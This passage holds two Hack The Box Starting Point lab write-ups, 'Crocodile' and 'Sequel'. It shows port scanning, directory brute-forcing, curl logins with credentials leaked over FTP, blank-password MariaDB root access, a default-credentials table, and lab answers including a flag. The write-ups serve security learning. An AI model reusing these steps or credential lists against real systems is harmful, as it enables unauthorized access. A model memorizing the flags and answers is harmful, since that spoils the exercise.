Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

---

## 🌐 Web Enumeration

### Initial Web Server Check

```bash
# Check HTTP headers
curl -I http://10.129.55.198/
```

**Output:**
```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
```

### Discover Protected Dashboard

```bash
# Check /dashboard endpoint
curl -I http://10.129.55.198/dashboard/
```

**Output:**
```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...; path=/
location: /login.php
```

### Directory Enumeration with Gobuster

```bash
# Directory brute force to find PHP files and login page
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

**Output:**
```text
===============================================================
/login.php            (Status: 200) [Size: 1577]
/dashboard            (Status: 301) [--> http://10.129.55.198/dashboard/]
/logout.php           (Status: 302) [--> login.php]
/config.php           (Status: 200) [Size: 0]
/assets               (Status: 301) [--> http://10.129.55.198/assets/]
/css                  (Status: 301) [--> http://10.129.55.198/css/]
/js                   (Status: 301) [--> http://10.129.55.198/js/]
===============================================================
```

**Why `-x php` Matters**

The `-x php` flag appends `.php` to each wordlist entry, which is essential for discovering PHP files. Without it, gobuster would only find directories (like `/dashboard/`) but miss critical PHP files like `login.php`, `config.php`, and `logout.php`. For PHP-based applications, always include the `-x php` flag to ensure complete enumeration.

### Verify Login Page

```bash
# Check if login.php exists
curl -I http://10.129.55.198/login.php
```

**Output:**
```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...; path=/
Content-Type: text/html; charset=UTF-8
```

### Inspect Login Form

```bash
# View the login form structure
curl -s http://10.129.55.198/login.php | grep -A 5 "<form"
```

**Output:**
```html
<form action="" method="post" name="Login_Form" class="form-signin">
    <input name="Username" type="username" placeholder="Username" required>
    <input name="Password" type="password" placeholder="Password" required>
    <button name="Submit" value="Login" type="submit">Sign in</button>
</form>
```

**Key Findings:**
- PHP application with session management
- Protected area: `/dashboard/`
- Authentication endpoint: `/login.php`
- **Form field names:** `Username` and `Password` (case-sensitive)

---

## 🔑 Credential Discovery

### Manual Testing of Credentials

Since automated tools can give false positives, credentials were tested manually by trying each username with each password from the FTP files.

**Testing approach:**
1. Use the correct case-sensitive form fields: `Username` and `Password`
2. After each login attempt, check if `/dashboard/` becomes accessible
3. Success is indicated by being able to access the dashboard with the session cookie

```bash
# Test a single combination
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Check if dashboard is accessible
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | head -20
```

**Working Combination Found:**

After testing the most likely candidates (starting with the `admin` username as it has the highest privilege), the following combination successfully authenticated:

| Field | Value |
|-------|-------|
| **Username** | `admin` |
| **Password** | `rKXM59ESxesUFHAd` |

**Why these worked:**
- `admin` is the privileged administrative account from `allowed.userlist`
- `rKXM59ESxesUFHAd` is the last password in `allowed.userlist.passwd`
- This combination successfully authenticated to the web application

---

## 🎯 Flag Discovery

### Authenticate and Retrieve Flag

```bash
# Login with found credentials and save session cookie
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s

# Get the full dashboard page
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

**Output:**
```html
<h2>Welcome admin!</h2>
<p>HTB{c7110277ac44d78b6a9fff2232434d16}</p>
```

### Extract Flag with grep

```bash
# Direct flag extraction
curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

**Output:**
```text
HTB{c7110277ac44d78b6a9fff2232434d16}
```

### One-Liner Method

```bash
# Login and get flag in one command
curl -X POST http://10.129.55.198/login.php \
  -d "Username=admin&Password=rKXM59ESxesUFHAd" \
  -c cookies.txt -L -s && curl -b cookies.txt http://10.129.55.198/dashboard/ -s | grep -oP 'HTB\{[^}]+\}'
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | What port is the web server running on? | `80` |
| 2 | What is the Apache version? | `2.4.41` |
| 3 | What FTP server version is running? | `vsFTPd 3.0.3` |
| 4 | What files did you find on the FTP server? | `allowed.userlist`, `allowed.userlist.passwd` |
| 5 | What credentials did you use to login to the web application? | `admin:rKXM59ESxesUFHAd` |
| 6 | What is the flag? | `HTB{c7110277ac44d78b6a9fff2232434d16}` |

---

## ⚡ Quick Reference

### Nmap Commands

```bash
# Full port scan
nmap -p- --min-rate 1000 10.129.55.198

# Service detection with scripts
nmap -sC -sV -p 21,80 10.129.55.198
```

### FTP Commands

```bash
# Connect anonymously
ftp 10.129.55.198
# Username: anonymous
# Password: (blank)

# Download files
get allowed.userlist
get allowed.userlist.passwd
```

### Gobuster Command

```bash
# Directory enumeration with PHP extension
gobuster dir -u http://10.129.55.198 -w /usr/share/wordlists/dirb/common.txt -x php
```

### Curl Authentication

```bash
# POST login (case-sensitive field names!)
curl -X POST http://10.129.55.198/login.php \
  -d "Username=USER&Password=PASS" \
  -c cookies.txt -L -s

# Access protected area with session
curl -b cookies.txt http://10.129.55.198/dashboard/ -s
```

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Always combine `-sC` and `-sV`** — Default scripts and version detection together reveal the most information about a service. |
| 2 | **Check FTP anonymous access** — A common misconfiguration that often exposes sensitive files like credential lists. |
| 3 | **Use gobuster with `-x php`** — The `-x` flag is essential for discovering PHP files; without it, you'll miss critical authentication pages. |
| 4 | **Follow redirect chains** — The redirect from `/dashboard/` to `/login.php` revealed the authentication endpoint. |
| 5 | **Inspect form field names** — The login form used `Username` and `Password` (case-sensitive), not `username`/`password`. |
| 6 | **Manual testing can be more reliable** — Automated tools can give false positives; manual testing with curl is often more dependable. |
| 7 | **Credentials may not be intuitive** — The working credentials were `admin:rKXM59ESxesUFHAd`, not `aron:root`. |

---

## 🔗 Resources

- [HTB Starting Point](https://www.hackthebox.com/starting-point)
- [vsFTPd Documentation](https://security.appspot.com/vsftpd.html)
- [Apache HTTP Server](https://httpd.apache.org/)
- [Gobuster GitHub](https://github.com/OJ/gobuster)

---

## 🏷️ Tags

`#htb` `#starting-point` `#crocodile` `#ftp` `#apache` `#gobuster` `#web-enumeration`

---

**Machine Completed** ✅

*Last Updated: March 26, 2026*

---

# HTB Starting Point: Sequel (MySQL/MariaDB)
  
| **Machine Info** | |
|------------------|-|
| **Name** | Sequel |
| **Difficulty** | Starting Point (Tier 1) |
| **Service** | MySQL / MariaDB |
| **Port** | 3306 |
| **Date Completed** | 2026-03-25 |

</div>

---

## 📋 Table of Contents
1. [Reconnaissance](#-reconnaissance)
2. [Service Enumeration](#-service-enumeration)
3. [Database Access](#-database-access)
4. [Flag Discovery](#-flag-discovery)
5. [Questions & Answers](#-questions--answers)
6. [Quick Reference](#-quick-reference)
7. [Lessons Learned](#-lessons-learned)

---

## 💻 Environment Setup

To ensure reproducibility and consistent results, the following environment was used for this engagement:

| **Component** | **Specification** |
| :--- | :--- |
| **Attack Machine** | Kali Linux (2024.x) / Parrot Security OS |
| **Hypervisor** | VMware Workstation / Oracle VirtualBox |
| **Connectivity** | OpenVPN (HTB Lab Configuration) |
| **Tools Used** | Nmap, MySQL-Client, Netcat (nc) |

> **Note:** Ensure your HTB VPN is active and you can `ping` the target IP before beginning enumeration.

---

## 🔍 Reconnaissance

### Port Scan
```bash
# Fast port scan to discover open ports
nmap -p- --min-rate 1000 10.129.95.232
```

**Results:**
```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Only port **3306 (MySQL)** is open, indicating a database server.

---

## 🛠️ Service Enumeration

### Version Detection with Nmap
```bash
# Service version detection
nmap -p 3306 -sV 10.129.95.232
```

### Manual Banner Grab (When Nmap Fails)
```bash
# Send MySQL protocol handshake to trigger version banner
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv 10.129.95.232 3306 | strings | grep -i "mysql\|mariadb"
```

**Output:**
```
5.5.5-10.3.27-MariaDB-0+deb10u1
mysql_native_password
```

**Interpretation:**
| Field | Value |
|-------|-------|
| **Database** | MariaDB 10.3.27 |
| **OS** | Debian 10 (buster) |
| **Auth Method** | mysql_native_password |

---

## 🔑 Database Access

### Initial Connection Attempt (SSL Error)
```bash
mysql -h 10.129.95.232 -u root
```

**Error:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

### Fix: Disable SSL
```bash
# Connect with SSL disabled
mysql -h 10.129.95.232 -u root --ssl=0

# Faster connection with auto-rehash disabled
mysql -h 10.129.95.232 -u root --ssl=0 -A
```

**✅ Success!** Connected as `root` with blank password (default credentials).

---

## 🗄️ Flag Discovery

### Step 1: List All Databases
```sql
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

### Step 2: Select Target Database
```sql
USE htb;
```

### Step 3: List Tables
```sql
SHOW TABLES;
```

**Output:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

### Step 4: Explore Tables
```sql
-- Check users table
SELECT * FROM users;
```

**Output:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
```

```sql
-- Check config table (flag location)
SELECT * FROM config;
```

**Output:**
```
+----+------+--------------------------+
| id | name | value                    |
+----+------+--------------------------+
|  1 | flag | HTB{REDACTED}   |
+----+------+--------------------------+
```

### 🎯 Flag Found!
```
HTB{REDACTED}
```

---

## 📝 Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | When using the MySQL command line client, what switch do we need to use in order to specify a login username? | `-u` |
| 2 | Which username allows us to log into this MariaDB instance without providing a password? | `root` |
| 3 | In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? | `*` (asterisk) |
| 4 | What is the name of the fourth database that's unique to this host? | `htb` |

---

## ⚡ Quick Reference

### MySQL Connection Commands
```bash
# Standard connection
mysql -h <IP> -u root --ssl=0

# Fast connection (no auto-rehash)
mysql -h <IP> -u root --ssl=0 -A

# With password prompt
mysql -h <IP> -u root -p --ssl=0
```

### Essential SQL Commands
```sql
-- Database exploration
SHOW DATABASES;
USE database_name;
SHOW TABLES;

-- Data retrieval
SELECT * FROM table_name;
DESCRIBE table_name;

-- System information
SELECT VERSION();
SELECT CURRENT_USER();
SELECT user, host FROM mysql.user;
```

### Banner Grab Commands
```bash
# MySQL / MariaDB
(echo -e "\x00\x00\x00\x01"; sleep 1) | nc -nv <IP> 3306 | strings | grep -i "mysql\|mariadb"

# Redis
echo -e "*1\r\n\$4\r\nINFO\r\n" | nc -nv <IP> 6379 | strings | grep redis_version

# Web Server
curl -I http://<IP>
```

---

## 🐛 Troubleshooting: SSL Errors

| Error | Solution |
|-------|----------|
| `TLS/SSL error: SSL is required` | Add `--ssl=0` or `--skip-ssl` |
| `unknown variable 'ssl-mode=DISABLED'` | Use `--ssl=0` (older MySQL versions) |
| `Can't connect to MySQL server` | Verify VPN connection and IP address |

---

## 📚 Default Credentials Reference

| Username | Password | Success Rate |
|----------|----------|--------------|
| `root` | (blank) | ⭐⭐⭐⭐⭐ (HTB Starting Point) |
| `root` | `root` | ⭐⭐ |
| `admin` | (blank) | ⭐ |
| `root` | `toor` | ⭐ |

---

## 💡 Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **Nmap isn't always enough** — Use service-specific banner grabs for version enumeration |
| 2 | **MySQL requires a protocol handshake** — Send `\x00\x00\x00\x01` to trigger version banner |
| 3 | **SSL errors are common** — Use `--ssl=0` to disable SSL on older MySQL versions |
| 4 | **Default credentials work** — Always try `root:blank` first on HTB Starting Point |
| 5 | **`*` is your friend** — Use `SELECT * FROM table` to explore unknown table structures |

---

## 🔗 Resources

- [MySQL Official Documentation](https://dev.mysql.com/doc/)
- [MariaDB Knowledge Base](https://mariadb.com/kb/en/documentation/)
- [HTB Academy: SQL Fundamentals](https://academy.hackthebox.com/course/preview/sql-fundamentals)
- [Nmap MySQL Scripts](https://nmap.org/nsedoc/categories/mysql.html)

---

## 🏷️ Tags

`#htb` `#starting-point` `#sequel` `#mysql` `#mariadb` `#sql` `#database` `#enumeration` `#banner-grabbing`

---

<div align="center">
  
**Machine Completed** ✅

*Last Updated: March 25, 2026*

</div>
